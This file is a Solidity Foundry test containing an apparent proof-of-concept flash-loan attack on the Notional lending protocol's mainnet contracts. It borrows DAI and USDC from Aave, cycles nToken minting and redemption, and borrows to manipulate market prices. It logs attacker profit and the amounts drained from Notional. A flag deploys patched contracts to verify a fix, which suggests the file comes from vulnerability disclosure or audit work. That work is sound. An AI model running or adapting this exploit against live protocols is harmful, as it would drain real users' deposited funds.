// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../contracts/global/Types.sol";
import { NotionalProxy } from "interfaces/notional/NotionalProxy.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";
import "contracts/math/SafeInt256.sol";
import "./Strings.sol";
import { nTokenHandler } from "../contracts/internal/nToken/nTokenHandler.sol";
import { AccountAction } from "../contracts/external/actions/AccountAction.sol";
import { Router        } from "../contracts/external/Router.sol";
import { ERC1155Action } from "../contracts/external/actions/ERC1155Action.sol";
import { TradingAction } from "../contracts/external/actions/TradingAction.sol";
import { BatchAction   } from "../contracts/external/actions/BatchAction.sol";

import { ILendingPoolAddressesProvider } from '../contracts/aave/ILendingPoolAddressesProvider.sol';
import { ILendingPool } from '../contracts/aave/ILendingPool.sol';
import { IERC20 } from "../contracts/aave/IERC20.sol";

interface IFlashLoanReceiver {
  function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
  ) external returns (bool);

  function ADDRESSES_PROVIDER() external view returns (ILendingPoolAddressesProvider);

  function LENDING_POOL() external view returns (ILendingPool);
}

enum TestAction {
    FlashAttack,
    BuyResiduals
}

struct User {
    string name;
    address addr;
}

struct Currency {
    string  name;
    uint16  currencyId;       // currencyId in Notional
    uint8   decimals;         // decimals of underlying
    uint256 exchangeRateUSD;  // of underlying token to USD to 8 decimal places
    address cAddr;            // compound address
    address addr;             // underlying token address
    address nTokenAddress;    // nToken address for this currency
    uint256 flashLoanAmount;  // max to transfer at once
    User    user;             // Fresh account to perform the attack with
}

contract NotionalFlashAttack is Test, IFlashLoanReceiver {
    using SafeMath for uint256;
    using SafeInt256 for int256;
    using Strings for string;

    NotionalProxy notional = NotionalProxy(0x1344A36A1B56144C3Bc62E7757377D288fDE0369);
    ILendingPoolAddressesProvider public immutable override ADDRESSES_PROVIDER =
        ILendingPoolAddressesProvider(0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5);
    ILendingPool public immutable override LENDING_POOL =
        ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    address alice = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address bob = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    address charlie = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;

    bool testFix = false; // If this is set to true then the test should fail.

    Currency[] currencies;
    uint256[] startingNotionalBalances;
    uint256[] endingNotionalBalances;

    TestAction testAction = TestAction.FlashAttack;

    uint32 NINE_MONTH_MATURITY = 1679616000;

    constructor() {
        currencies.push(Currency("DAI",
                                2,
                                18,
                                1_00000000,
                                0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643,
                                0x6B175474E89094C44Da98b954EedeAC495271d0F,
                                notional.nTokenAddress(2),
                                188_000_000_000000000000000000,
                                User("Alice", alice))

                        );
        currencies.push(Currency("USDC",
                                3,
                                6,
                                1_00000000,
                                0x39AA39c021dfbaE8faC545936693aC917d5E7563,
                                0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
                                notional.nTokenAddress(3),
                                250_000_000_000000,
                                User("Bob", bob))

                        );


        // Attack does not work on WBTC. Perhaps it is configured differently in some key way?

        // currencies.push(Currency("WBTC",
        //                         4,
        //                         8,
        //                         20_000_00000000,
        //                         0xccF4429DB6322D5C611ee964527D42E5d685DD6a,
        //                         0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
        //                         notional.nTokenAddress(4),
        //                         10_00000000
        //                         )
        //                 );
    }

    /*
     *               ***********************
     *               *** ATTACK FUNCTION ***
     *               ***********************
     *
     * This function is called from the flash loan's `executeOperation` function
     */
    function performAttack(Currency memory c) internal {

        // Transfer all the funds to the fresh account
        IERC20(c.addr).transfer(c.user.addr, IERC20(c.addr).balanceOf(address(this)));

    vm.startPrank(c.user.addr);
        uint256 bal;
        bal = IERC20(c.addr).balanceOf(c.user.addr);
        console.log("%s balance at beginning = %s", c.name, uintToString(bal, c.decimals));

        bal = IERC20(c.addr).balanceOf(c.user.addr);
        // logAll("Before deposit and mint", c);
        depositAndMintNTokens(c, bal);

        //logAll("Before redeem", c);
        uint96 userNTokenBalance = getNTokenBalance(c.user);
        (int256 numRedeemed,) = notional.nTokenRedeem(c.user.addr, c.currencyId, userNTokenBalance, true, true);

        //logAll("After redeem", c);


        uint88 userToWithdraw = getCurrencyToWithdraw(c.user);
        console.log("userToWithdraw = %s", uintToString(userToWithdraw, 8));
        notional.withdraw(c.currencyId, userToWithdraw, true); // redeem to underlying


        if (c.currencyId == 2 /* DAI */) {

            /* It's hard to believe how hacky the code just within this block is:
             * What it demonstrates is that it is possible to manipulate the price in
             * order to get a better outcome for the attacker
             *
             * Of course this code only works for the particular block number that this Foundry
             * test is run against.
             *
             * For DAI borrowing from market 1 and market 3 influenced the outcome.
             * Borrowing from market 2 did not.
             */

            int val1 = 2_700_000_00000000;
            int val3 = 900_000_00000000;

            deposit(c, 500_000_000000000000000000);

            borrow(c, val1, 1);
            borrow(c, val3, 3);

            bal = IERC20(c.addr).balanceOf(c.user.addr);
            depositAndMintNTokens(c, bal);
            userNTokenBalance = getNTokenBalance(c.user);
            (numRedeemed,) = notional.nTokenRedeem(c.user.addr, c.currencyId, userNTokenBalance, true, true);

            // logAll("After lend", c);

            userToWithdraw = getCurrencyToWithdraw(c.user);
            console.log("userToWithdraw (second time)= %s", uintToString(userToWithdraw, 8));
            notional.withdraw(c.currencyId, userToWithdraw, true); // redeem to underlying
        }

        if (c.currencyId == 3 /* USDC */) {

            /* It's hard to believe how hacky the code just within this block is:
             * What it demonstrates is that it is possible to manipulate the price in
             * order to get a better outcome for the attacker
             *
             * Of course this code only works for the particular block number that this Foundry
             * test is run against.
             *
             * For USDC borrowing from market 1 was the only thing that influenced the outcome
             */

            int val1 = 1_000_000_00000000;
            deposit(c, 250_000_000000);
            borrow(c, val1, 1);

            bal = IERC20(c.addr).balanceOf(c.user.addr);
            depositAndMintNTokens(c, bal);
            userNTokenBalance = getNTokenBalance(c.user);
            (numRedeemed,) = notional.nTokenRedeem(c.user.addr, c.currencyId, userNTokenBalance, true, true);

            // logAll("After lend", c);

            userToWithdraw = getCurrencyToWithdraw(c.user);
            console.log("userToWithdraw (second time)= %s", uintToString(userToWithdraw, 8));
            notional.withdraw(c.currencyId, userToWithdraw, true); // redeem to underlying
        }



        bal = IERC20(c.addr).balanceOf(c.user.addr);
        console.log("%s balance at end     = %s", c.name, uintToString(bal, c.decimals));

        IERC20(c.addr).transfer(address(this), bal);
    vm.stopPrank();

    }

    function buyResiduals(Currency memory c) public {
        // Transfer all the funds to the fresh account
        IERC20(c.addr).transfer(c.user.addr, IERC20(c.addr).balanceOf(address(this)));

      vm.startPrank(c.user.addr);
        uint256 bal;
        bal = IERC20(c.addr).balanceOf(c.user.addr);

        logNTokenPortfolio();
        purchaseNTokenResidual(c, NINE_MONTH_MATURITY,  -1_000_000_00000000, bal);
        // logAll("After residual purchase -- ", c);
        console.log("=======================================");
        logNTokenPortfolio();


      vm.stopPrank();
    }

    function setUp() public {
        vm.label(0x1344A36A1B56144C3Bc62E7757377D288fDE0369, "NotionalProxy");
        vm.label(0x1d1a531CBcb969040Da7527bf1092DfC4FF7DD46, "BatchAction");

        for (uint256 i = 0; i < currencies.length; i++) {
            Currency memory c = currencies[i];
            vm.label(c.addr, c.name);
            vm.label(c.cAddr, string("c").concat(c.name));
            vm.startPrank(c.user.addr);
                IERC20(c.addr).approve(address(notional), type(uint256).max);
            vm.stopPrank();
            uint256 inNotionalBefore = IERC20(c.cAddr).balanceOf(address(notional));
            startingNotionalBalances.push(inNotionalBefore);
        }

        if (testFix) {
            vm.startPrank(notional.owner());
            AccountAction accountAction = new AccountAction();
            BatchAction batchAction = new BatchAction();

            Router newRouter = new Router(
                0x38A4DfC0ff6588fD0c2142d14D4963A97356A245, // governance
                0xBf91ec7A64FCF0844e54d3198E50AD8fb4D68E93, // views
                0xe3E38607A1E2d6881A32F1D78C5C232f14bdef22, // initializeMarket
                0xeA82Cfc621D5FA00E30c10531380846BB5aAfE79, // nTokenActions
                // 0x1d1a531CBcb969040Da7527bf1092DfC4FF7DD46, // batchAction
                address(batchAction),
                address(accountAction),                     // accountAction
                0xBf12d7e41a25f449293AB8cd1364Fe74A175bFa5, // erc1155
                0xa3707CD595F6AB810a84d04C92D8adE5f7593Db5, // liquidateCurrency
                0xfB56271c976A8b446B6D33D1Ec76C84F6AA53F1B, // liquidatefCash
                0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5, // cETH
                0x5fd75e91Cc34DF9831Aa75903027FC34FeB9b931, // treasury
                0xbE4AbA25915BAd390edf83B7e1ca44b6145F261e  // calculationViews
            );
            notional.upgradeTo(address(newRouter));
            vm.stopPrank();
        }
    }

    function testFlashLoan() public {
        uint256 len = currencies.length;
        address[] memory addresses = new address[](len);
        uint256[] memory amounts = new uint256[](len);
        uint256[] memory modes   = new uint256[](len);

        for (uint256 i = 0; i < len; i++) {
          Currency memory c = currencies[i];
          addresses[i] = c.addr;
          amounts[i] = c.flashLoanAmount;
          modes[0] = 0;
        }

        LENDING_POOL.flashLoan(
            address(this),
            addresses,
            amounts,
            modes,
            address(this),
            bytes(""),
            0
        );

        // The rest of the test is in executeOperation below
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        uint256 i;

        if (testAction == TestAction.FlashAttack) {

            console.log("*** Making my attack run *** ");
            uint256 totalEconomicDamage = 0;

            for (i = 0; i < currencies.length; i++) {
                Currency memory c = currencies[i];
                console.log("\n\n  ---- Summary for %s ----", c.name);
                performAttack(c);
                uint256 balAtEnd = IERC20(c.addr).balanceOf(address(this));
                require(balAtEnd > amounts[i], "Attack failed. Did not make profit");
                totalEconomicDamage += (balAtEnd - amounts[i]) * 10**8 / 10**c.decimals; // scaled to 8 decimals
                console.log("Economic damage = %s", uintToString(balAtEnd - amounts[i], c.decimals));

                balAtEnd -= premiums[i];  // subtract the premium to see what attacker gains
                console.log("Attacker profit = %s", uintToString(balAtEnd - amounts[i], c.decimals));
                console.log("Percent gain (after Aave flash loan fee) = %s%%", uintToString(balAtEnd*10_000/amounts[i] - 10_000, 4));
            }

            console.log("\n  ---- Final Summary ----");
            console.log("Total economic damage = %s", uintToString(totalEconomicDamage, 8));
            for (i = 0; i < currencies.length; i++) {
                Currency memory c = currencies[i];
                uint256 balAtEnd = IERC20(c.cAddr).balanceOf(address(notional));
                console.log("%s drained from Notional = %s",
                cName(c),
                uintToString(startingNotionalBalances[i] - balAtEnd, 8)
                );

            }



        } else if (testAction == TestAction.BuyResiduals) {
            buyResiduals(currencies[0]);
        }


        // Approve the LendingPool contract allowance to *pull* the owed amount
        for (i = 0; i < assets.length; i++) {
            if (IERC20(assets[i]).balanceOf(address(this)) < amounts[i] + premiums[i] ) {
              revert("Not enough cash to repay flash loan");
            }
            uint amountOwing = amounts[i] + premiums[i];
            IERC20(assets[i]).approve(address(LENDING_POOL), amountOwing);
        }
        return true;
    }


    // Returns maturities for fCash in descending order
    function getMaturities(User memory u) internal returns (uint256[] memory maturities){
        (,,PortfolioAsset[] memory pas) = notional.getAccount(u.addr);
        maturities = new uint256[](pas.length);
        for (uint256 i = 0; i < pas.length; i++) {
            maturities[pas.length - 1 - i] = pas[i].maturity;
        }
        return maturities;
    }


    function getNTokenBalance(User memory u) internal returns (uint96) {
        (,AccountBalance[] memory userAbs,) = notional.getAccount(u.addr);
        uint96 userNTokenBalance = uint96(uint256(userAbs[0].nTokenBalance));
        return userNTokenBalance;
    }


    function getCurrencyToWithdraw(User memory u) internal returns (uint88) {
        (, int256[] memory fcArray) = notional.getFreeCollateral(u.addr);
        return uint88(int88(fcArray[0]));
    }

    function depositAndMintNTokens(Currency memory c, uint256 amount) internal {
        BalanceAction memory ba;
        BalanceAction[] memory bas;

        ba.actionType = DepositActionType.DepositUnderlyingAndMintNToken;
        ba.currencyId = c.currencyId;
        ba.depositActionAmount = amount;
        bas = new BalanceAction[](1);
        bas[0] = ba;
        notional.batchBalanceAction(c.user.addr, bas);
    }

    function deposit(Currency memory c, uint256 amount) internal {
        BalanceAction memory ba;
        BalanceAction[] memory bas;

        ba.actionType = DepositActionType.DepositUnderlying;
        ba.currencyId = c.currencyId;
        ba.depositActionAmount = amount;

        bas = new BalanceAction[](1);
        bas[0] = ba;
        notional.batchBalanceAction(c.user.addr, bas);
    }

    function borrow(Currency memory c, int256 amount, uint8 marketIndex) internal {
        BalanceActionWithTrades memory bawt;
        BalanceActionWithTrades[] memory bawts;

        (bytes32 trade,) =
          encodeLendBorrowTrade(
            TradeActionType.Borrow,
            marketIndex,
            amount,
            0
          );

        bawt.actionType = DepositActionType.DepositUnderlying;
        bawt.currencyId = c.currencyId;
        bawt.depositActionAmount = 0;
        bawt.trades = new bytes32[](1);
        bawt.trades[0] = trade;
        bawts = new BalanceActionWithTrades[](1);
        bawts[0] = bawt;
        notional.batchBalanceAndTradeAction(c.user.addr, bawts);
    }

    function lend(Currency memory c, int256 amount, uint8 marketIndex) internal {
        BalanceActionWithTrades memory bawt;
        BalanceActionWithTrades[] memory bawts;

        (bytes32 trade,) =
          encodeLendBorrowTrade(
            TradeActionType.Lend,
            marketIndex,
            amount,
            0
          );

        bawt.actionType = DepositActionType.DepositUnderlying;
        bawt.currencyId = c.currencyId;
        bawt.depositActionAmount = 0;
        bawt.trades = new bytes32[](1);
        bawt.trades[0] = trade;
        bawts = new BalanceActionWithTrades[](1);
        bawts[0] = bawt;
        notional.batchBalanceAndTradeAction(c.user.addr, bawts);
    }

    function purchaseNTokenResidual(Currency memory c, uint32 maturity, int88 fCashAmount, uint256 amount) internal {
        BalanceActionWithTrades memory bawt;
        BalanceActionWithTrades[] memory bawts;

        bytes32 trade = encodePurchaseNTokenResidual(maturity, fCashAmount);

        bawt.actionType = DepositActionType.DepositUnderlying;
        bawt.currencyId = c.currencyId;
        bawt.depositActionAmount = amount;
        bawt.trades = new bytes32[](1);
        bawt.trades[0] = trade;
        bawts = new BalanceActionWithTrades[](1);
        bawts[0] = bawt;
        notional.batchBalanceAndTradeAction(c.user.addr, bawts);
    }



    function exchangeAmount(Currency memory c, uint256 amount) internal returns (uint256) {
        return amount * c.exchangeRateUSD / 10**8;
    }

    //
    // Logging
    //
    function logAll(string memory title, Currency memory c) internal {
        console.log("All {");
        (AccountContext memory ac,,PortfolioAsset[] memory pas) = notional.getAccount(c.user.addr);
        logAccountContextWithIndent(2, title, ac);
        logAccountBalanceWithIndent(2, title, c.user.addr);
        logPortfolioAssetArrayWithIndent(2, title, pas);
        MarketParameters[] memory mps = notional.getActiveMarkets(c.currencyId);
        logMarketParametersArrayWithIndent(2, title.concat(" c").concat(c.name), mps);
        logFreeCollateralWithIndent(2, title, c.user.addr);
        console.log("}");
    }

    function logNTokenPortfolio() public {

        for (uint256 i; i != currencies.length; i++) {
            Currency memory c = currencies[i];
            console.log("------ NTokenPortfolio for %s -------", c.name);
            address nTokenAddress = notional.nTokenAddress(c.currencyId);
            (PortfolioAsset[] memory liquidityTokens,
            PortfolioAsset[] memory netfCashAssets) =
                notional.getNTokenPortfolio(nTokenAddress);

            (,,,,,int256 cashBalance,,) = notional.getNTokenAccount(nTokenAddress);
            console.log("cashBalance of %s = %s", c.name, intToString(cashBalance, 8));
            console.log("--- netfCashAssets %s ---", c.name);
            logPortfolioAssetArray("netfCashAssets", netfCashAssets);
        }
    }


    function logAccountContext(string memory title, AccountContext memory s) internal  {
        logAccountContextWithIndent(0, title, s);
    }

    function logAccountContextWithIndent(uint256 i, string memory title, AccountContext memory s) internal  {
        string memory ind = indent(i);
        console.log("%s%s AccountContext {", ind, title);
        console.log("%s  nextSettleTime   = %s", ind, s.nextSettleTime);
        console.log("%s  hasDebt          = %s", ind, vm.toString(s.hasDebt));
        console.log("%s  assetArrayLength = %s", ind, s.assetArrayLength);
        console.log("%s  bitmapCurrencyId = %s", ind, s.bitmapCurrencyId);
        console.log("%s  activeCurrencies = %s", ind, vm.toString(s.activeCurrencies));
        console.log("%s}", ind);
    }


    function logAccountBalance(string memory title, address account) internal  {
        logAccountBalanceWithIndent(0, title, account);
    }

    function logAccountBalanceWithIndent(uint256 i, string memory title, address account) internal  {
        string memory ind = indent(i);
        (,AccountBalance[] memory abs,PortfolioAsset[] memory pas) = notional.getAccount(account);
        uint256 j;
        for (j = 0; j < abs.length; ++j) {
            AccountBalance memory ab = abs[j];
            if (ab.currencyId == 0) continue;
            console.log("%s%s AccountBalance {", ind, title);
            console.log("%s  currencyId           = %s", ind, ab.currencyId);
            console.log("%s  cashBalance          = %s", ind, intToString(ab.cashBalance, 8));
            console.log("%s  nTokenBalance        = %s", ind, intToString(ab.nTokenBalance, 8));
            console.log("%s  lastClaimTime        = %s", ind, ab.lastClaimTime);
            console.log("%s  accountIncentiveDebt = %s", ind, ab.accountIncentiveDebt);
            console.log("%s}", ind);
        }
    }
    function logFreeCollateral(string memory title, address account) internal {
        logFreeCollateralWithIndent(0, title, account);
    }
    function logFreeCollateralWithIndent(uint256 indent_, string memory title, address account) internal {
        string memory ind = indent(indent_);
        (int256 fc, int256[] memory fcArray) = notional.getFreeCollateral(account);
        uint256 i;
        console.log("%sFreeCollateral {", ind);
        console.log("%s%s Free collateral (in ETH)= %s", ind, title, intToString(fc, 18));
        console.log("%scash amounts (in compound token):", ind);
        console.log("%s  [", ind);
        for (i = 0; i < fcArray.length; ++i) {
            if (fcArray[i] == 0) continue;
            console.log("%s    %d: %s", ind, i, intToString(fcArray[i], 8));
        }
        console.log("%s  ]", ind);
        console.log("%s}", ind);
    }

    function logAssetRateParameters(AssetRateParameters memory ar) internal {
        logAssetRateParametersWithIndent(0, ar);
    }


    function logAssetRateParametersWithIndent(uint256 i, AssetRateParameters memory ar) internal {
        string memory ind = indent(i);
        console.log("%sAssetRateParameters {", ind);
        console.log("%s  rateOracle         = %s", ind, address(ar.rateOracle));
        console.log("%s  rate               = %s", ind, vm.toString(ar.rate));
        console.log("%s  underlyingDecimals = %s", ind, vm.toString(ar.underlyingDecimals));
        console.log("%s}", ind);
    }

    function logETHRate(ETHRate memory er) internal {
        console.log("ETHRate {");
        console.log("  rateDecimals        = %s", vm.toString(er.rateDecimals));
        console.log("  rate                = %s", vm.toString(er.rate));
        console.log("  buffer              = %s", vm.toString(er.buffer));
        console.log("  haircut             = %s", vm.toString(er.haircut));
        console.log("  liquidationDiscount = %s", vm.toString(er.liquidationDiscount));
        console.log("}");
    }

    function logPortfolioAsset(PortfolioAsset memory s) internal {
        logPortfolioAssetWithIndent(0, s);
    }

    function logPortfolioAssetWithIndent(uint256 i, PortfolioAsset memory s) internal {
        string memory ind = indent(i);
        console.log("%sPortfolioAsset {", ind);
        console.log("%s  currencyId = %s", ind, s.currencyId);
        console.log("%s  maturity = %s", ind, s.maturity);
        console.log("%s  assetType = %s", ind, s.assetType);
        console.log("%s  notional = %s", ind, intToString(s.notional, 8));
        console.log("%s  AssetStorageState = ", ind, stringOfAssetStorageState(s.storageState));
    }

    function logPortfolioState(PortfolioState memory s) internal {
        logPortfolioStateWithIndent(0, s);
    }

    function logPortfolioStateWithIndent(uint256 i, PortfolioState memory s) internal {
        string memory ind = indent(i);
        console.log("%sPortfolioState {", ind);
        console.log("%s  storedAssets = ", ind);
        console.log("%s    [", ind);
        uint256 j;
        for (j = 0; j < s.storedAssets.length;j++) {
          logPortfolioAssetWithIndent(i + 3, s.storedAssets[j]);
        }
        console.log("%s    ]", ind);

        console.log("%s  newAssets = ", ind);
        console.log("%s    [");
        for (j = 0; j < s.newAssets.length; j++) {
          logPortfolioAssetWithIndent(i + 3, s.newAssets[j]);
        }
        console.log("%s    ]", ind);
        console.log("%s  lastNewAssetIndex = %s", ind, s.lastNewAssetIndex);
        console.log("%s  storedAssetLength = %s", ind, s.storedAssetLength);
        console.log("%s}", ind);
    }

    function logCashGroupParameters(CashGroupParameters memory s) internal {
        logCashGroupParametersWithIndent(0, s);
    }

    function logCashGroupParametersWithIndent(uint256 i, CashGroupParameters memory s) internal {
        string memory ind = indent(i);
        console.log("%sCashGroupParameters {", ind);
        console.log("%s  currencyId = %s", ind, s.currencyId);
        console.log("%s  maxMarketIndex = %s", ind, s.maxMarketIndex);
        console.log("%s  assetRate =", ind);
        logAssetRateParametersWithIndent(i + 3, s.assetRate);
        console.log("%s  data = %s", vm.toString(s.data));
        console.log("%s}", ind);
    }

    function logNTokenPortfolio(nTokenPortfolio memory s) internal {
        logNTokenPortfolioWithIndent(0, s);
    }

    function logNTokenPortfolioWithIndent(uint256 i, nTokenPortfolio memory s) internal {
        string memory ind = indent(i);
        console.log("%snTokenPortfolio {", ind);
        console.log("%s  cashGroup =");
        logCashGroupParametersWithIndent(i + 3, s.cashGroup);
        console.log("%s  portFolioState =");
        logPortfolioStateWithIndent(i + 3, s.portfolioState);
        console.log("%s  totalSupply         = %s", ind, vm.toString(s.totalSupply));
        console.log("%s  cashBalance         = %s", ind, vm.toString(s.cashBalance));
        console.log("%s  lastInitializedTime = %s", ind, s.lastInitializedTime);
        console.log("%s  paramters           = %s", ind, vm.toString(s.parameters));
        console.log("%s  tokenAddress        = %s", ind, s.tokenAddress);
        console.log("%s}", ind);
    }

    function logNTokenLiquidityAndFCash(string memory title, Currency memory currency) internal {
        require (currency.nTokenAddress != address(0), "nTokenAddress == 0");
        (PortfolioAsset[] memory liquidityTokens, PortfolioAsset[] memory netfCashAssets) =
          notional.getNTokenPortfolio(currency.nTokenAddress);
        console.log("%s NTokenPortfolio {", title);
        logPortfolioAssetArrayWithIndent(1, "nToken liquidity tokens", liquidityTokens);
        logPortfolioAssetArrayWithIndent(1, "nToken netfCashAssets", liquidityTokens);
        console.log("}");
    }

    function logPortfolioAssetArray(string memory title, PortfolioAsset[] memory ss) internal {
        logPortfolioAssetArrayWithIndent(0, title, ss);
    }

    function logPortfolioAssetArrayWithIndent(uint256 i, string memory title, PortfolioAsset[] memory ss) internal {
        string memory ind = indent(i);
        console.log("%s%s portfolio assets = [", ind, title);
        uint256 j;
        for (j = 0; j < ss.length; ++j) {
            logPortfolioAssetWithIndent(i + 1, ss[j]);
        }
        console.log("%s]", ind);
    }

    function logMarketParametersArray(string memory title, MarketParameters[] memory ss) internal {
        logMarketParametersArrayWithIndent(0, title, ss);
    }

    function logMarketParametersArrayWithIndent(uint256 i, string memory title, MarketParameters[] memory ss) internal {
        string memory ind = indent(i);
        console.log("%s%s market parameters = [", ind, title);
        uint256 j;
        for (j = 0; j < ss.length; ++j) {
            logMarketParametersWithIndent(i + 1, ss[j]);
        }
        console.log("%s]", ind);
    }

    function logMarketParameters(MarketParameters memory s) internal {
        logMarketParametersWithIndent(0, s);
    }

    function logMarketParametersWithIndent(uint256 i, MarketParameters memory s) internal {
        string memory ind = indent(i);
        console.log("%sMarketParameters {", ind);
        console.log("%s  storageSlot = %s", ind, vm.toString(s.storageSlot));
        console.log("%s  maturity = %s", ind, s.maturity);
        console.log("%s  totalfCash = %s", ind, intToString(s.totalfCash, 8));
        console.log("%s  totalAssetCash = %s", ind,intToString(s.totalAssetCash, 8));
        console.log("%s  totalLiquidity = %s", ind, intToString(s.totalLiquidity, 8));
        console.log("%s  lastImpliedRate = %s", ind, uintToString(s.lastImpliedRate, 8));
        console.log("%s  oracleRate = %s", ind, uintToString(s.oracleRate, 8));
        console.log("%s  previousTradeTime = %s", ind, s.previousTradeTime);
        console.log("%s}", ind);
    }

    function logCashGroupSettings(CashGroupSettings memory s) internal {
        logCashGroupSettingsWithIndent(0, s);
    }

    function logCashGroupSettingsWithIndent(uint256 i, CashGroupSettings memory s) internal {
        string memory ind = indent(i);
        uint256 j;
        console.log("%sCashGroupSettings {", ind);
        console.log("%s  maxMarketIndex              = %d", ind, s.maxMarketIndex);
        console.log("%s  rateOracleTimeWindow5Min    = %d", ind, s.rateOracleTimeWindow5Min);
        console.log("%s  totalFeeBPS                 = %d", ind, s.totalFeeBPS);
        console.log("%s  reserveFeeShare             = %d", ind, s.reserveFeeShare);
        console.log("%s  debtBuffer5BPS              = %d", ind, s.debtBuffer5BPS);
        console.log("%s  fCashHaircut5BPS            = %d", ind, s.fCashHaircut5BPS);
        console.log("%s  settlementPenaltyRate5BPS   = %d", ind, s.settlementPenaltyRate5BPS);
        console.log("%s  liquidationfCashHaircut5BPS = %d", ind, s.liquidationfCashHaircut5BPS);
        console.log("%s  liquidationDebtBuffer5BPS   = %d", ind, s.liquidationDebtBuffer5BPS);
        console.log("%s  liquidityTokenHaircuts      = [", ind);
        for (j = 0; j < s.liquidityTokenHaircuts.length; ++j) {
        console.log("%s    %s", ind, s.liquidityTokenHaircuts[j]);
        }
        console.log("%s  ]", ind);
        console.log("%s  rateScalars                 = [", ind);
        for (j = 0; j < s.rateScalars.length; ++j) {
        console.log("%s    %s", ind, s.rateScalars[j]);
        }
        console.log("%s  ]", ind);
        console.log("%s}", ind);
    }

    function stringOfAssetStorageState(AssetStorageState s) internal returns (string memory) {
        if (s == AssetStorageState.NoChange)  {
            return "AssetStorageState.NoChange";
        } else if (s == AssetStorageState.Update)  {
            return "AssetStorageState.Update";
        } if (s == AssetStorageState.Delete)  {
            return "AssetStorageState.Delete";
        } if (s == AssetStorageState.RevertIfStored)  {
            return "AssetStorageState.RevertIfStored";
        }
    }

   function indent(uint256 level) internal returns (string memory) {
        uint i;
        string memory s = "";
        for (i = 0; i < level; i++) {
            s = s.concat("  ");
        }
        return s;
    }

    function intToString(int256 n, uint8 decimals) internal returns (string memory) {
        string memory s;
        if (n < 0) {
            s = "-";
            n = n * -1;
        } else {
            s = "";
        }
        string memory s_ = uintToString(uint256(n), decimals);
        return s.concat(s_);
    }

    function logCurrency(string memory title, address user, Currency memory c) internal {
        uint256 bal = IERC20(c.cAddr).balanceOf(user);
        console.log("%s balance %s = %s", cName(c), title, uintToString(bal, 8));
    }

    function logEthBalance(address account) internal {
        console.log("ETH balance %s = %s", account, uintToString(account.balance, 18));
    }


    function uintToString(uint256 n, uint8 decimals) internal returns (string memory){
        bool pastDecimals = decimals == 0;
        uint256 place = 0;
        uint256 r; // remainder
        string memory s = "";

        while (n != 0) {
            r = n % 10;
            n /= 10;
            place++;
            s = toDigit(r).concat(s);
            if (pastDecimals && place % 3 == 0 && n!= 0) {
                s = string("_").concat(s);
            }
            if (!pastDecimals && place == decimals) {
                pastDecimals = true;
                place = 0;
                s = string("_").concat(s);
            }
        }
        if (pastDecimals && place == 0) {
            s = string("0").concat(s);
        }
        if (!pastDecimals) {
            uint256 i;
            uint256 upper = (decimals >= place  ? decimals - place : 0);
            for (i = 0; i < upper; ++i) {
                s = string("0").concat(s);
            }
            s = string("0_").concat(s);
        }
        return s;
    }

    function toDigit(uint256 n) internal returns (string memory) {
        if      (n == 0) {
            return "0";
        } else if (n== 1) {
            return "1";
        } else if (n == 2) {
            return "2";
        } else if (n == 3) {
            return "3";
        } else if (n == 4) {
            return "4";
        } else if (n == 5) {
            return "5";
        } else if (n == 6) {
            return "6";
        } else if (n == 7) {
            return "7";
        } else if (n == 8) {
            return "8";
        } else if (n == 9) {
            return "9";
        } else {
            revert("Not in range 0 to 10");
        }
    }

    function cName(Currency memory c) internal returns (string memory) {
        return string("c").concat(c.name);
    }

    function encodeLendBorrowTrade(
        TradeActionType actionType,
        uint8 marketIndex,
        int256 fCash,
        uint32 slippage
    ) internal pure returns (bytes32 encodedTrade, uint88 fCashAmount) {
        uint256 absfCash = uint256(fCash.abs());
        require(absfCash <= uint256(type(uint88).max));

        encodedTrade = bytes32(
            (uint256(uint8(actionType)) << 248) |
            (uint256(marketIndex) << 240) |
            (uint256(absfCash) << 152) |
            (uint256(slippage) << 120)
        );

        fCashAmount = uint88(absfCash);
    }

    function encodePurchaseNTokenResidual(
        uint32 maturity,
        int88 fCashResidualAmount
    ) internal pure returns (bytes32 encodedTrade){
        encodedTrade = bytes32(
            uint256(uint8(TradeActionType.PurchaseNTokenResidual)) << 248 |
            uint256(maturity) << 216 |
            uint256(uint88(fCashResidualAmount)) << 128
        );
    }


}